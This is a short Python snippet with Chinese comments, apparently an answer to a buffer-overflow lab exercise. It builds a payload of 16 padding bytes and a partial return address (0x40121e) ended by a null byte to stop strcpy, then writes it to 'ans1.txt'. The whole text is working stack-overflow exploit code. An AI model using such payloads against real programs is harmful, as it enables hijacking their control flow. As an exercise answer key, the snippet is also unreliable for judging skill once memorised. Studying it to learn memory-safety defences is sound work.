payload  = b"A" * 16          # 覆盖到返回地址起点（offset=16）
payload += b"\x1e\x12\x40"    # 目标地址低 3 字节（0x40121e）
payload += b"\x00"            # 让 strcpy 停止，并把第 4 字节写成 0

with open("ans1.txt", "wb") as f:
    f.write(payload)
